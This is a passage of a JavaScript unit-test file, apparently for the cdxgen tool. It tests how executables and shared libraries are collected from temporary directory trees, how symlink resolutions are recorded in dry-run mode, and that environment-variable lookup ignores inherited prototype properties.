      assert.deepStrictEqual(result, ["usr/bin/which", "usr/sbin/zramctl"]);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("collectExecutables() resolves followed symlink targets in dry-run mode", () => {
    if (process.platform === "win32") {
      return;
    }
    const tempDir = mkdtempSync(path.join(tmpdir(), "cdxgen-executables-"));
    setDryRunMode(true);
    resetRecordedActivities();
    try {
      mkdirSync(path.join(tempDir, "usr", "bin"), { recursive: true });
      writeFileSync(path.join(tempDir, "usr", "bin", "which"), "#!/bin/sh\n");
      chmodSync(path.join(tempDir, "usr", "bin", "which"), 0o755);
      symlinkSync(path.join(tempDir, "usr", "bin"), path.join(tempDir, "bin"));

      const result = collectExecutables(tempDir, ["/bin"]);

      assert.deepStrictEqual(result, ["usr/bin/which"]);
      const symlinkActivities = getRecordedActivities().filter(
        (activity) => activity.kind === "symlink-resolution",
      );
      for (const symlinkActivity of symlinkActivities) {
        assert.strictEqual(symlinkActivity.traceDetail, undefined);
      }
    } finally {
      setDryRunMode(false);
      resetRecordedActivities();
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("collectExecutables() skips files already owned by OS packages", () => {
    if (process.platform === "win32") {
      return;
    }
    const tempDir = mkdtempSync(path.join(tmpdir(), "cdxgen-executables-"));
    try {
      mkdirSync(path.join(tempDir, "usr", "bin"), { recursive: true });
      writeFileSync(path.join(tempDir, "usr", "bin", "owned"), "#!/bin/sh\n");
      writeFileSync(path.join(tempDir, "usr", "bin", "unowned"), "#!/bin/sh\n");
      chmodSync(path.join(tempDir, "usr", "bin", "owned"), 0o755);
      chmodSync(path.join(tempDir, "usr", "bin", "unowned"), 0o755);

      const result = collectExecutables(
        tempDir,
        ["/usr/bin"],
        ["/usr/bin/owned"],
      );

      assert.deepStrictEqual(result, ["usr/bin/unowned"]);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("collectSharedLibs() preserves symlink alias entries while tracing resolutions", () => {
    if (process.platform === "win32") {
      return;
    }
    const tempDir = mkdtempSync(path.join(tmpdir(), "cdxgen-shared-libs-"));
    try {
      mkdirSync(path.join(tempDir, "usr", "lib"), { recursive: true });
      writeFileSync(path.join(tempDir, "usr", "lib", "libfoo.so.1"), "binary");
      symlinkSync(
        path.join(tempDir, "usr", "lib", "libfoo.so.1"),
        path.join(tempDir, "usr", "lib", "libfoo.so"),
      );

      const result = collectSharedLibs(tempDir, ["/usr/lib"]);

      assert.deepStrictEqual(result, [
        "usr/lib/libfoo.so",
        "usr/lib/libfoo.so.1",
      ]);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("collectSharedLibs() skips libraries already owned by OS packages", () => {
    if (process.platform === "win32") {
      return;
    }
    const tempDir = mkdtempSync(path.join(tmpdir(), "cdxgen-shared-libs-"));
    try {
      mkdirSync(path.join(tempDir, "usr", "lib"), { recursive: true });
      writeFileSync(path.join(tempDir, "usr", "lib", "libowned.so.1"), "owned");
      writeFileSync(
        path.join(tempDir, "usr", "lib", "libunowned.so.1"),
        "unowned",
      );

      const result = collectSharedLibs(
        tempDir,
        ["/usr/lib"],
        undefined,
        undefined,
        ["/usr/lib/libowned.so.1"],
      );

      assert.deepStrictEqual(result, ["usr/lib/libunowned.so.1"]);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("collectSharedLibs() adds only the extra globs it is given", () => {
    const tempDir = mkdtempSync(path.join(tmpdir(), "cdxgen-shared-libs-"));
    try {
      mkdirSync(path.join(tempDir, "usr", "lib"), { recursive: true });
      mkdirSync(path.join(tempDir, "usr", "lib", "apache2", "modules"), {
        recursive: true,
      });
      writeFileSync(path.join(tempDir, "usr", "lib", "libfoo.so"), "binary");
      writeFileSync(
        path.join(tempDir, "usr", "lib", "apache2", "modules", "libphp.so"),
        "module",
      );
      writeFileSync(
        path.join(tempDir, "usr", "lib", "apache2", "modules", "mod_other.so"),
        "module",
      );

      // glob answers with the host's separator, so Windows sees usr\lib\...
      const posixPaths = (files) =>
        files.map((file) => file.replaceAll("\\", "/"));
      // The default globs are one level deep and stay that way.
      assert.deepStrictEqual(
        posixPaths(collectSharedLibs(tempDir, ["/usr/lib"])),
        ["usr/lib/libfoo.so"],
      );
      // The opt-in glob reaches the Apache module directory but nothing else.
      assert.deepStrictEqual(
        posixPaths(
          collectSharedLibs(
            tempDir,
            ["/usr/lib"],
            undefined,
            undefined,
            [],
            ["**/usr/lib/apache2/modules/libphp*.so"],
          ),
        ),
        ["usr/lib/apache2/modules/libphp.so", "usr/lib/libfoo.so"],
      );
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it("recordSymlinkResolution() normalizes mixed path separators before comparing paths", () => {
    setDryRunMode(true);
    resetRecordedActivities();
    try {
      const activity = recordSymlinkResolution(
        "usr\\bin\\which",
        "usr/bin/which",
      );
      assert.strictEqual(activity, undefined);
      assert.deepStrictEqual(getRecordedActivities(), []);
    } finally {
      setDryRunMode(false);
      resetRecordedActivities();
    }
  });

  it("recordSymlinkResolution() normalizes failed resolution paths without exposing trace detail", () => {
    setDryRunMode(true);
    resetRecordedActivities();
    try {
      recordSymlinkResolution("/tmp/root/usr/lib/libfoo.so", undefined, {
        basePath: "/tmp/root",
        errorCode: "ENOENT",
        metadata: {
          resolutionKind: "shared-library",
        },
        status: "failed",
      });
      const symlinkActivity = getRecordedActivities().find(
        (activity) => activity.kind === "symlink-resolution",
      );
      assert.ok(symlinkActivity);
      assert.strictEqual(symlinkActivity.target, "usr/lib/libfoo.so");
      assert.strictEqual(symlinkActivity.errorCode, "ENOENT");
      assert.strictEqual(symlinkActivity.traceDetail, undefined);
      assert.strictEqual(symlinkActivity.resolvedPath, undefined);
      assert.strictEqual(symlinkActivity.status, "failed");
    } finally {
      setDryRunMode(false);
      resetRecordedActivities();
    }
  });
});

it("readEnvironmentVariable() reads only variables set in the environment", () => {
  Object.prototype.CDXGEN_INHERITED_TEST_VAR = "polluted";
  process.env.CDXGEN_OWN_TEST_VAR = "own";
  try {
    assert.strictEqual(
      readEnvironmentVariable("CDXGEN_INHERITED_TEST_VAR"),
      undefined,
    );
    assert.strictEqual(readEnvironmentVariable("toString"), undefined);
    assert.strictEqual(readEnvironmentVariable("CDXGEN_OWN_TEST_VAR"), "own");
    if (platform() === "win32") {
      // Windows environment names ignore case.
      assert.strictEqual(readEnvironmentVariable("cdxgen_own_test_var"), "own");
      assert.ok(readEnvironmentVariable("Path"));
    }
  } finally {
    delete Object.prototype.CDXGEN_INHERITED_TEST_VAR;
    delete process.env.CDXGEN_OWN_TEST_VAR;
  }
});
